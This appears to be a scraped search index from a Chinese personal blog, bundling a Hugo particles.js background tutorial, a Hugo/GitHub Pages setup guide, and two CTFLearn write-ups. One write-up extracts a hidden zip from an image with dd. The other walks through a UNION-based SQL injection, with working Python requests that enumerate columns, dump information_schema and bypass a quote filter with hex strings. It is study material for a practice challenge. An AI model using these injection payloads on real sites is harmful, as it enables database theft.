你可能会认为，这篇博文的第二步和第三步完全可以调换顺序，如果你这么想了，也这么做了，那我祝你不要踩到我踩过的坑。\n我们要在第二步的div底下写入插件。\n为什么这样？因为JavaScript的加载顺序是从前往后的。有过Bootstrap框架使用经验的朋友应该知道，在使用Bootstrap的JS应用时，要在之前首先引入jQuery，否则整个页面将无法实现应有的功能！\n我们的顺序也是如此。在我使用这个插件的时候，尝试过过几种方法：在/asset/js文件夹中放入相应的JS文件；在partials文件夹中写一个custom_js.html文件，里面是几条简单的\u0026lt;script\u0026gt;标签；修改partials文件夹中的head.html文件，在头部就引入插件；在第二步的\u0026lt;div\u0026gt;之前写入几条\u0026lt;script\u0026gt;标签。\n以上方法全部失败。\n因此，你不要小看这篇博文的分量，它可能可以帮助你节省几个小时的试错时间。\n言归正传，我们还是需要把插件的JS文件引入到源码中。要想插件能够工作，你只需要使用两个文件：particles.js和app.js，他们分别在第一步那个项目的根目录里，还有Demo文件夹里。particles.js是发挥功能的文件，而app.js是配置文件，具体能配置些什么，后面再说，总之，先使用别人帮你写好的东西吧。\n接下来的一步很重要：把这两个文件放入public/js文件夹中!\n你都看到这篇文章了，肯定已经在GitHub上有自己的第一个页面了吧？你会发现，public文件夹的结构跟你的仓库的结构是一样的，我们的GitPage的CSS、JS等文件，都存在对应的路径底下。也就是说，**当你把这两个JS文件放到了public/js文件夹底下，你等一下git push的时候就会把这两个文件也一并推送到远程仓库的对应位置。**这样，你的源码就能找到JS文件了。\n将两个JS文件引入，记得放在第二步的div后面：\n\u0026lt;script src=\u0026#34;xxxxx/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;xxxxx/particles.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 这里的“xxxx”是你放置这两个文件的路径，我接下来要教你一个取巧的办法。\n巧妙地获取路径 如果你的代码中，这两个JS文件的路径出了问题，那很不幸，当你打开页面的时候一定是见不到背景的，而且，你按下F12，还能看到控制台给你报出的无情的404 Not Found。\n我们要怎么使远程仓库中的代码也能找到正确的路径呢？如果使用src=\u0026quot;/js/app.js\u0026quot;这样的语句，当你打开网站的主页，它会找到https://yourWeb.github.io/js/app.js，看起来非常的正确；但是当你在网站里面的某个页面里，比如某一篇博文中，它就会去找https://yourWeb.github.io/post/article1/js/app.js，必然是失败的，于是你的博文就不能有漂亮的背景了 :(\n正确的获取路径的姿势，你可以直接使用绝对路径，也就是https://yourWeb.github.io/js/app.js这样的方式。\n底下是我的代码，绝对路径的方法理论上适用于所有主题，你应该把代码里的src值改成自己的仓库：\n\u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/particles.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/app.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; 代码的最终样式及推送 经过一系列的修改后，你的页面的代码就多了如下的东西：\n\u0026lt;div id=\u0026#34;particles-js\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/particles.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/app.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; 此外，你的public/js文件夹中还多了两个文件app.js和particles.js。\n现在，不要以为一切已经结束了，因为你的这个div，你的页面现在多了一个元素，如果它位于footer上方，那它会使得你的页面被撑得很长，我们要在主页面的CSS文件里修改它。\n进入public/css文件夹，如果是Keepit主题，就只有一个文件，打开它；如果是其他主题，你需要找到能发挥作用的CSS。\n在文件最末尾补上这样的代码：\n.particles-js-canvas-el { position:fixed; top:0; left:0; width:100% } position设定为fixed，使得整块画布独立于你页面的其他元素；由于它独立了，就需要使用top、left来指定它的位置；最后是画布的宽度，填满整个屏幕即可。\n这样，就完成了所有的步骤了。\n我们回顾一下总共做了什么：\n下载主题，将两个JS文件放到public/js文件夹里。 在代码的相应位置写上div。 在div的下方用script标签和绝对路径引入这两个文件。 修改CSS，使背景独立。 完成以上步骤，就使用hugo编译静态页面，然后进入public文件夹用git把它推送到远程仓库上吧！\n背景样式的修改 如果一切顺利，你的背景已经很不错了。现在你可以通过配置app.js的方法进一步修改它。\napp.js文件是配置背景的文件，它可以改变背景中每个粒子的形状、颜色、移动方式等等。\n下面这个链接将每一个字段的取值和含义写得非常清楚：\n(https://www.jb51.net/article/123594.htm)\n例如我的particles.color.value = \u0026quot;random\u0026quot;，这是为了在白色主题的情况下也可以看到背景特效。\n一些细节 此部分增加于2021年1月14日\n博客已经发布了十来篇文章，重看此文，有一些细节（或不如说是遗留的BUG）是值得一提的。\nJS的加载顺序。本文前面的代码已经将JS的加载顺序考虑了进来，且添加了async标签指示浏览器按照顺序加载两个JS文件，然而这样的写法似乎是无用的，因为我的博客还是时不时地丢失掉背景效果；实际上使得JS按照顺序加载的办法还有不少，可以留待读者自行查找资料实现（主要是作者懒）。 hugo的版本。博客搭建指南——1中提到了要下载hugo-extend，你除了使用文章中介绍的办法下载之外，还可以使用chocolate包管理器下载，具体做法可以使用搜索引擎查找，比较简单。而正如那篇文章中所说，如果你不安装extend版本，你将无法编译SCSS文件，而这对于我们这款主题（相信还有其他很多精美的主题）来说是很致命的。与本文相关的，如果你使用的不是extend版本的hugo，你在第5小节中自定义的CSS样式可能不会生效。 以上，是本篇的全部内容。\n","date":"2020-09-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%972/","title":"博客搭建指南——2"},{"content":"题目链接：(https://ctflearn.com/challenge/97)\n一道隐写题，信息隐藏在给出的图片文件里。\n打开图片，是一张普通的png，使用010editor打开，发现实际上是jpg格式（以FF开头）。\n010 editor搜索FF D9，找到偏移量为0x256E处的那个，发现其后有敏感的PK字样，这是zip文件的开头，线索已经出现了。\n使用命令分离出zip文件。dd if=AGT.png bs=1 skip=9584 of=foo.zip\n解压文件，得到一个文件夹，里面含有一张图片I Warned You.jpeg\n010 editor打开该文件，发现它实际上不符合JPG文件的格式。用记事本打开，ctrl + f查找ctf字样，得到flag。\n回顾\n这道题大概做了将近一小时\u0026hellip; 是我接触隐写题的简单解法之后第一次实践。解压之后的jpg文件使我一度怀疑自己对偏移量的计算存在问题，万万没想到这jpg格式完全是用来坑爹的（= = ||）。\n使用记事本一开始查找的是flag字串，结果是没找到，居然也没有再找一下其他可能的形式，就这么回去又反复检查zip文件的偏移地址了\u0026hellip;\u0026hellip;\n","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/ctflearn-07601/","title":"CTFLearn-07601"},{"content":"题目链接：(https://ctflearn.com/challenge/149)\n此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手\u0026hellip; \u0026hellip;\n根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;}) soup = BeautifulSoup(ret.text, \u0026#39;lxml\u0026#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 or 1=1\u0026#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;-2 union select 1,2,3\u0026#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;-2 union select 1,2,3,4\u0026#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,2,3,4,5\u0026#34;}) # Output: # 0 results 已经明确了，系统做的每一次查询结果就是有四个字段，只需要将对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来。\n开始查看数据库名，使用database()函数或者information_schema数据库维护的信息。\ninformation_schema 是MySQL自带的数据库，它保存着MySQL服务器维护的所有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。 在此仅记录第二种办法。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4\u0026#34;}) # Output: # Name: Information_schema, webeight # Breed: 1 # Color: 3 这里，group_concat使得查询结果是批量的，而第二个字段对应地显示出了我们希望看到的——所有的数据库名。\n开始查询webeight数据库中的数据表。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4\u0026#34;}) # Output: # Name: w0w_y0u_f0und_m3,webeight # Breed: 1 # Color: 3 这里需要注意，本来第二个字段的SQL语句应该是：\nselect group_concat(table_name) from information_schema.tables where table_schema='webeight'\n但是，这道题中的单引号是被过滤的！\n于是采用十六进制来表示webeight这个字符串，直接转换，不需要考虑什么大端小端存储-。（我在说什么x）\n于是就有了上面的那句：\nselect group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874\n得到的结果也是比较漂亮的，找到了关键的表。\n得到表之后，要查找字段了。方法差不多，总的来说就是在折腾information_schema库中存储的信息而已。\nselect group_concat(column_name) from information_schema.columns where table_schema=0x7765626569676874 and table_name=0x7730775f7930755f6630756e645f6d33 # Output: # Name: f0und_m3 # ... 这里是第二个字段要填入的SQL语句，比较长，因此不写出完整的python语句，以免阻碍观瞻。\n此处要注意，group_concat()中的字段名column_name是一定不能改的，包括之前的所有SQL语句，在查询information库的时候，选用的字段名要按照规定的来，否则必然得不到结果。\n以上已经得到了目标表的目标字段，使用最后一个简单的查询结束这道题：\nselect f0und_m3 from w0w_y0u_f0und_m3 # Output: # Name: abctf{uni0n_1s_4_gr34t_c0mm4nd} # ... 总结 这道题光是题解就已经写了将近一小时，只希望日后有人读起时不要忘记作者作为一个菜鸡在这题面前苦苦挣扎的一下午。SQL注入真是一个漫长而复杂的过程，而其中多数难点就在于搞安全的人对于数据库语句、底层实现等的不了解；我在今天才接触到了information_schema、group_concat等诸多知识，想来这作为一个练习还是使我获益颇多，但今后，我还是更愿意投靠自动化工具的阵营\u0026hellip; \u0026hellip;\n","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/ctflearn-inj3ctiontime/","title":"CTFLearn-Inj3ctionTime"},{"content":"当你见到这篇文章的时候，意味着我可以用一种比价体面的方式向所有人分享我的学识和想法了。\n搭建博客，说难也难，说容易也容易。难在确定和学习一款建站工具，以及选择一款好看的主题（或者手写一款好看的主题），而容易指的是当你稍微会使用建站工具、并非常幸运地选中了一款好看且易于配置的主题之后，一切后续都变得无比丝滑。\n本博客，部署于GitHub，属于静态网页，使用Hugo搭建，使用现成的主题https://themes.gohugo.io/keepit/。\n如果你觉得这个主题不错，那么非常幸运地，你可以参考我将要写下的经验，否则本篇对你的意义将打个折扣了。\nThen, let\u0026rsquo;s go!\n下载Hugo Hugo 是一款基于Go语言的建站工具，官网说它是“世界上最快的网站框架”，主要正是由于Go语言的高效。这款软件使用起来比较简单，虽然我在整个搭建过程中出了无数错，但是只要你跟着我接下来的介绍走，就只需要使用短短的几个命令。\n但是首先，下载一个Hugo是一切步骤的开始。以下步骤全部基于Windows10系统（主要是我没有Mac）。\n我们去到下面的这个网址：\nhttps://github.com/gohugoio/hugo/releases\n在里面你可以下载Windows系统下的Hugo，注意是Hugo_extend而不是hugo，因为有些主题里面用到了SASS/SCSS，需要extend版本的hugo才能完成编译。\n将下载的压缩包解压，得到一个文件夹，里面有hugo.exe。接下来将这个文件夹的位置添加到系统环境变量中，就跟你配置java或者是python完全一样，还需要我再讲吗？\n好吧，念及这篇博文主要是写给像当年的我一样年轻且好奇的同学，如果有任何问题，还请照着以下步骤来：\n右键 我的电脑 \u0026ndash;\u0026gt; 属性 \u0026ndash;\u0026gt; 高级系统设置（在左边栏里） \u0026ndash;\u0026gt; 环境变量（在弹出的窗口的右下角） \u0026ndash;\u0026gt; 在系统变量中找到 path 这一栏，把你放置Hugo.exe的文件夹路径写进去。\n接下来打开你的命令行窗口，试着执行 hugo version ，如果你没有得到报错，而是得到了一个hugo的版本信息，那么恭喜你，你取得了一个非常不错的开端！\n新建站点 用hugo新建站点实在是非常简单。在你电脑上某个位置打开你的命令行，敲上命令：\nhugo new site [yourSiteName]\n就完事了！这里的 [yourSiteName] 可以替换成任何你想要的名字，为你的网站起个好名吧！\n如果顺利的话，你将会得到一个名字为yourSiteName的文件夹，里面有一些hugo为你初始化好的文件夹，你可以使用ls查看它们。\n新建站点 选择主题 “一款好看的主题是你坚持写博客的最大动力。” ——沃兹·基·硕德\n你现在浏览的——也就是我的博客——主题是：https://themes.gohugo.io/keepit/\n实际上，在上面这个网站上还有非常多的酷炫的主题，完全看你的喜好去选择——不考虑配置难度的情况下 ヽ(ー_ー)ノ\n当你选定了一个主题，点进去，一般都会在底下有一个非常周到的安装指南（真的只是安装指南o(╥﹏╥)o）。\n就以这款KeepIt主题为例，我们的网站根目录下有一个themes文件夹，你只需要进入这个文件夹，使用命令git clone https://github.com/Fastbyte01/KeepIt.git，就可以将这个主题下载到你的网站里了。从此，你就可以快乐地使用themes文件夹底下存在的主题，而且变换主题的成本非常之低，这个我们之后会讲。\n2022-04-05注：目前博客的主题已经不是KeepIt，而是Stack，详情参见 Hugo Stack主题更新小记 (xrg.fj.cn) 。\n配置页面 现在让你的命令行回到网站的根目录下，写下命令hugo server --theme=keepit -D，然后你就发现hugo已经在你的电脑上跑起了一个Web服务。打开浏览器，根据命令行的提示输入地址，就可以访问你的页面了！刚才说过，当你的themes文件夹下面有多个主题时，你可以轻易地更换它们，具体的操作就是将--theme这个参数指定为你想用的主题的名字，就问你简单不？\n回到你的网站上吧，看看效果。\n什么？你说你的页面现在空无一物？或者你的页面还只是个模板？理所当然。因为你还没有配置它。\n打开你刚才下载的主题文件夹，一般来讲，里面都有一个exampleSite文件夹，打开它，把里面的所有文件复制到网站根目录，直接替换掉你原有的东西即可。\n2022-04-05注：为了日后换主题的方便，已经不建议将 exampleSite 全部复制到根目录中。目前来看，我们只需要复制里面的 content 文件夹和 config 文件即可。修改主题时直接进入 theme 文件夹修改，这样一来日后可以更加方便地改变博客主题。\n现在再运行，你发现你的网站已经颇有点样子了，只不过里面的页面还有显示的内容还是别人写好的，你希望把它们换成自己的内容。\nOK，一步一步来。首先，根目录底下有一个文件config.toml，打开它，以keepit主题为例，里面是一系列参数名称和数值。\n从上往下看，在第四行有个title = xxx，这就是你的网站的标题了，你把它改掉，然后看看效果，你瞬间就明白这个配置文件的作用了，这比我在这里用文字描述要生动一万倍。\n继续往下看，你可以找到一个用中括号括起来的[menu]字段，在底下你看到了什么？yes，你现在可以配置顶栏了！比如，我将底下第一个[[menu.main]]的name字段由post改为博文，在网页对应的位置，post也变成了博文！\n继续往下看，你可以看到一个[params]字段，这是适用于整个站点的一些参数。里面有个avatar参数，它用于配置你的主页面上的那个头像，你可以把它注释掉，然后启用下方几行的[params.gravatar]字段，它会将你的主页图片替换为你独有的gravatar，当然，如果你不知道什么是gravatar，百度之。\n主页的底下有四个链接按钮，你在[params.social]字段下可以找到对应的配置。比如我，就把里面的Instagram、Linkedin都注释掉了，只保留了Twitter和Github，所以你在我的主页上只能找到这两个链接。\n继续往下，就是一些无关紧要的参数了，你可以暂且忽略它们。当你走到这里，你的网站已经初步具有你的个人特色了，但我还要带你继续配置你的网站。\n进一步配置页面 从你的主页上点击头像或者右上角进入post，你会发现里面的文章都是一些别人已经写好的东西，你一定会希望把它们换掉，但是它们在哪里？\n打开网站的根目录，进入content，你会看到一个posts文件夹和一个projects文件夹，还有一个aboutme.md文件，它们是什么？\n进入posts文件夹，所有的博文都存在这里。你可以把里面的文件删掉，换成你自己的Markdown文件，但是不要急，先打开别人的文件，看看hugo解析文件时需要的特定的格式：\n比如我打开了hugoisforlovers.md，在里面，头几行的位置我们能看到这些东西：\ntitle = \u0026#34;Getting Started with Hugo\u0026#34; description = \u0026#34;\u0026#34; type = [\u0026#34;posts\u0026#34;,\u0026#34;post\u0026#34;] tags = [ \u0026#34;go\u0026#34;, \u0026#34;golang\u0026#34;, \u0026#34;hugo\u0026#34;, \u0026#34;development\u0026#34;, ] date = \u0026#34;2014-04-02\u0026#34; categories = [ \u0026#34;Development\u0026#34;, \u0026#34;golang\u0026#34;, ] series = [\u0026#34;Hugo 101\u0026#34;] [ author ] name = \u0026#34;Hugo Authors\u0026#34; 它们是一个文件被解析时需要的一些参数。比如文件标题 title，比如文件类型tags和caterogies，你自己写Markdown文件时也需要在头部附上这些东西，否则它在你的网站上就无法体现出相关的信息。具体的做法是使用两行---把你的这些信息夹起来，然后hugo就能进行识别了。如果是智能一点的Markdown编辑器，可能直接弹出一个非常明显的提示，告知你这里是输入头部信息的地方。在此强烈推荐Typora！！\n会修改你的博文之后，你可以顺便改一改about.md，它是这个主题里面自我介绍的那一页。\n一切都完事之后，你的网站已经是一个承载着你个人信息、存放着你个人博文的站点了。你可以直接进入发布环节，也可以再进行更精细的配置——修改网页源码。\n我们的网站页面都在你的主题文件夹里面。进入你的主题文件夹，能看到一个layouts的文件夹，点进去，里面是一些模板HTML。有些主题里，你可以从index.html文件修改一些信息，但是在我们的keepit主题，这个文件并没有什么价值，你需要再进入partials文件内，这里的文件们才是你需要阅读与修改的。\n你可以看到一个home_profile.html文件，这是默认情况下你的主页。仔细阅读，你应该可以悟到这里使用了很多配置文件中的参数，比如{{ .Site.Params.avatar}}，就是你在配置文件中定义的图像！\n换一个文件，比如footer.html，你应该可以悟到这一页掌管着主页下方的版权说明！如果你不满意主页底下的copyright，不妨对其进行修改。\n这里的文件不可能逐一讲解，自己去阅读它们，时刻牢记你配置文件里的东西，你完全可以配置一个很漂亮的页面。\n将页面部署到GitHub上 对于页面的配置，我目前讲的完全是够用了（主要是其他的操作我也不会 x）。如果之后有更多的需求，完全可以新开一篇博文，在此就不多赘述了。\n我们现在需要将页面部署到GitHub上，为什么不用Gitee？因为Gitee会出现一大堆路径问题。你不要觉得我在造谣，也不要觉得网上一堆博客可供参考，事实就是我尝试了几天，看了一大堆文章，但是我的Gitee上的博客完全无法加载样式。\n在这里不禁想讲道理，国家战略支持的平台就这么个鸟样子，想做到跟GitHub分庭抗礼真的是任重道远。\n如果你成功在Gitee上部署了自己的博客，欢迎联系我，我非常乐意学习，并将自己的博客迁移到Gitee上。\n2022-04-05注：Gitee的易用性已经得到了长足的改进，我在这里保留此前的牢骚之语，以侧面映证Gitee的令人欣慰的进步。不过，Gitee上面关于言论的自动审查不够智能，我仍然使用Github作为博客部署的平台。\n回到主题，首先要在GitHub上建立一个仓库，这个仓库的名字非常特殊，它必须是username.github.io，其中的username就是你的GitHub用户名。比如我的用户名是SGS4ever，那么我的仓库就是SGS4ever.github.io。\n建立完成后，在站点根目录下使用命令hugo --theme=keepit --baseUrl=\u0026quot;https://SGS4ever.github.io -D\u0026quot;你就会得到一文件夹public，进入它，在里面打开GitBash，进行一系列操作：\ngit init git add . git commit -m \u0026#34;Your comment\u0026#34; git remote add origin https://xxxxxxxxxxx # 注意，这里的https://xxxxxx 是你刚创建的仓库的地址，也就是当你进入仓库页面，你的浏览器上方地址栏里面的东西。 git push -u origin master 这些操作之后，你的GitHub仓库里就多了很多东西了，完全不需要任何操作，直接打开浏览器访问https://username.github.io吧！\n写在最后 搭建博客真的是费了很大的功夫，但我万万没想到这些无用功实际上是Gitee的问题，实在是愤意难平。\n国产的很多东西——并不止Gitee——希望与国外的东西竞争，还需要非常努力。有些情况下并不是你实现了同样的功能，你就具备了同样的竞争力，还需要考虑到这些功能的易用性、稳定性。当你的东西用起来比别人更繁琐，以至于这种繁琐给用户带来的负面感受压过了爱国情怀的正面加持，你的竞争就注定失败了。\n2022-03-16注：岁月不居，时节如流，Gitee Page的易用性已经得到了很大的提升，且我的博客主题早已不是keepit了；\n","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%971/","title":"博客搭建指南——1"}]